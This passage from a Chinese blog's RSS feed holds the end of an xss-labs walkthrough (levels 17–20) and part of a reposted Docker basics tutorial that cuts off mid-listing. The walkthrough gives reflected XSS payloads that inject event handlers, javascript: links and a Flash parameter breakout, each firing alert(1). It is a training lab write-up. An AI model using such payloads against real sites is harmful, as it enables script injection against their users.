&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?arg01=a&amp;amp;arg02=aaa onmousemove=&amp;#x27;alert(1)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501125037463.png&#34; alt=&#34;image-20240501125037463&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第十八关&#34;&gt;&lt;a href=&#34;#第十八关&#34; class=&#34;headerlink&#34; title=&#34;第十八关&#34;&gt;&lt;/a&gt;第十八关&lt;/h2&gt;&lt;p&gt;这一关和上一关基本上是一样的&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?arg01=a&amp;amp;arg02=aaa onmousemove=alert(1)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501130406838.png&#34; alt=&#34;image-20240501130406838&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第十九关&#34;&gt;&lt;a href=&#34;#第十九关&#34; class=&#34;headerlink&#34; title=&#34;第十九关&#34;&gt;&lt;/a&gt;第十九关&lt;/h2&gt;&lt;p&gt;这里无法继续使用前两关的payload，因为他利用双引号将其闭合掉了，没法绕出去了&lt;/p&gt;
&lt;p&gt;这一关用到的是flash xss&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?arg01=version&amp;amp;arg02=&amp;lt;a href=&amp;quot;javascript:alert()&amp;quot;&amp;gt;here&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;第二十关&#34;&gt;&lt;a href=&#34;#第二十关&#34; class=&#34;headerlink&#34; title=&#34;第二十关&#34;&gt;&lt;/a&gt;第二十关&lt;/h2&gt;&lt;p&gt;这一关需要反编译的知识点&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?arg01=id&amp;amp;arg02=\%22))&amp;#125;catch(e)&amp;#123;&amp;#125;if(!self.a)self.a=!alert(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?arg01=id&amp;amp;arg02=xss\&amp;quot;))&amp;#125;catch(e)&amp;#123;alert(1)&amp;#125;//%26width=123%26height=123&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;参考文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/l2872253606/article/details/125638898&#34;&gt;https://blog.csdn.net/l2872253606/article/details/125638898&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/338123.html&#34;&gt;https://www.freebuf.com/articles/web/338123.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/u014029795/article/details/103213877&#34;&gt;https://blog.csdn.net/u014029795/article/details/103213877&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_30702413/article/details/99326627&#34;&gt;https://blog.csdn.net/weixin_30702413/article/details/99326627&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/u014029795/article/details/103217680&#34;&gt;https://blog.csdn.net/u014029795/article/details/103217680&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/04/27/other/basic/Docker%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80%E8%AF%A6%E8%A7%A3/</guid>
            <title>Docker使用基础详解</title>
            <link>https://w-sqrt7.github.io/2024/04/27/other/basic/Docker%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80%E8%AF%A6%E8%A7%A3/</link>
            <category>转载</category>
            <category>基础</category>
            <pubDate>Sat, 27 Apr 2024 11:00:42 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Docker使用基础详解&#34;&gt;&lt;a href=&#34;#Docker使用基础详解&#34; class=&#34;headerlink&#34; title=&#34;Docker使用基础详解&#34;&gt;&lt;/a&gt;Docker使用基础详解&lt;/h1&gt;&lt;h2 id=&#34;一、什么是docker&#34;&gt;&lt;a href=&#34;#一、什么是docker&#34; class=&#34;headerlink&#34; title=&#34;一、什么是docker&#34;&gt;&lt;/a&gt;一、什么是docker&lt;/h2&gt;&lt;p&gt;Docker 是一个开源的应用容器引擎，基于Go 语言并遵从 Apache2.0 协议开源。&lt;/p&gt;
&lt;p&gt;Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。&lt;/p&gt;
&lt;p&gt;容器是完全使用沙箱机制，相互之间不会有任何接口，更重要的是容器性能开销极低。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;容器和镜像&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过镜像启动一个容器，一个镜像是一个可执行的包，其中包括运行应用程序所需要的所有内容包含代码，运行时间，库、环境变量、和配置文件。容器是镜像的运行实例，当被运行时有镜像状态和用户进程，可以使用docker ps 查看。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;容器和虚拟机&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;容器时在linux上本机运行，并与其他容器共享主机的内核，它运行的一个独立的进程，不占用其他任何可执行文件的内存，非常轻量。&lt;/p&gt;
&lt;p&gt;虚拟机运行的是一个完成的操作系统，通过虚拟机管理程序对主机资源进行虚拟访问，相比之下需要的资源更多。&lt;/p&gt;
&lt;h2 id=&#34;二、docker和docker-compose&#34;&gt;&lt;a href=&#34;#二、docker和docker-compose&#34; class=&#34;headerlink&#34; title=&#34;二、docker和docker-compose&#34;&gt;&lt;/a&gt;二、docker和docker-compose&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Prince_WCS/article/details/135180728&#34;&gt;原文链接 ψ(｀∇´)ψ 强烈推荐看完&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Docker 是一种可以让您把 WordPress 应用和它需要的环境（比如 PHP、MySQL 等）打包成一个个小盒子的技术，这个小盒子就叫做容器。&lt;/p&gt;
&lt;p&gt;Docker Compose 是一种可以让您用一个文件来管理多个容器的工具，是 Docker 的一个子项目，可以帮助用户定义和运行多容器 Docker 应用程序，使用 Docker Compose 可以更轻松地管理多个容器的应用程序。&lt;/p&gt;
&lt;p&gt;比如，您的 WordPress 应用可能需要一个 web 容器和一个 db 容器，分别运行 WordPress 程序和 MySQL 数据库。如果您只用 Docker，您可能需要分别创建和启动这两个容器，然后还要设置它们之间的连接。如果您用 Docker Compose，您只需要在一个文件里写下这两个容器的配置，然后用一个命令就可以一起创建和启动它们，而且它们之间的连接也会自动设置好。这样，您就可以更轻松地管理和运行您的 WordPress 应用。&lt;/p&gt;
&lt;h2 id=&#34;三、常用命令&#34;&gt;&lt;a href=&#34;#三、常用命令&#34; class=&#34;headerlink&#34; title=&#34;三、常用命令&#34;&gt;&lt;/a&gt;三、常用命令&lt;/h2&gt;&lt;h3 id=&#34;docker常用命令&#34;&gt;&lt;a href=&#34;#docker常用命令&#34; class=&#34;headerlink&#34; title=&#34;docker常用命令&#34;&gt;&lt;/a&gt;docker常用命令&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;**************************************docker命令******************************************&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 启动docker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;systemctl start docker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 关闭docker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;systemctl stop docker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 重启docker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;systemctl restart docker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# docker设置随服务启动而自启动&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;systemctl enable docker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;************************************docker镜像命令*****************************************&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 拉取镜像&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 不加tag(版本号) 即拉取docker仓库中 该镜像的最新版本latest 加:tag 则是拉取指定版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# https://hub.docker.com/search?type=image （去官网镜像搜索）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker pull 镜像名 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker pull 镜像名:tag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 查看镜像列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker images&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 搜索镜像&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker search 镜像名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker search --filter=STARS=9000 mysql 搜索 STARS &amp;gt;9000的 mysql 镜像&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 删除镜像&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 删除一个&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker rmi -f 镜像名/镜像ID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 删除多个 其镜像ID或镜像用用空格隔开即可 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker rmi -f 镜像名/镜像ID 镜像名/镜像ID 镜像名/镜像ID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 删除全部镜像  -a 意思为显示全部, -q 意思为只显示ID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker rmi -f $(docker images -aq)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;************************************docker容器命令*****************************************&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 查看所有容器列表（包含 正在运行 和 已停止的）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker ps -a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 启动容器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker start 容器ID/容器名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 停止容器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker stop 容器ID/容器名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 重启容器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker restart 容器ID/容器名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# kill 容器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker kill 容器ID/容器名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 容器文件拷贝 （无论容器是否开启 都可以进行拷贝）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# docker cp 容器ID/名称:文件路径  要拷贝到外部的路径 | 要拷贝到外部的路径  容器ID/名称:文件路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 示例：docker cp nginx:/etc/nginx/conf.d /data/applications/nginx/conf/conf.d&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 从容器内 拷出&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker cp 容器ID/名称: 容器内路径  容器外路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 从外部 拷贝文件到容器内&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker  cp 容器外路径 容器ID/名称: 容器内路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 查看容器日志&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker logs -f --tail=要查看末尾多少行，默认all 容器ID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 更换容器名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker rename 容器ID/容器名 新容器名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 停止运行的容器 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker stop 容器名/容器ID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 删除一个容器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker rm -f 容器名/容器ID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 删除多个容器 空格隔开要删除的容器名或容器ID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker rm -f 容器名/容器ID 容器名/容器ID 容器名/容器ID&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 删除全部容器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker rm -f $(docker ps -aq)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 进入容器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker exec -it 容器名/容器ID /bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 直接退出 （如果没有添加-d 参数(持久化运行容器) 该容器会被关闭 ） &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 优雅退出 （无论是否添加-d 参数 容器都不会被关闭）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ctrl + p + q &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 查看 Docker 容器、镜像、卷等资源的占用情况&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker system df&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 清理所有废弃镜像与Build Cache 		#谨慎使用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker system prune -a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#清理整个 Docker 系统中的未在使用资源，包括未使用的镜像、容器、网络和数据卷等。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&#34;docker-compose常用命令&#34;&gt;&lt;a href=&#34;#docker-compose常用命令&#34; class=&#34;headerlink&#34; title=&#34;docker-compose常用命令&#34;&gt;&lt;/a&gt;docker-compose常用命令&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span 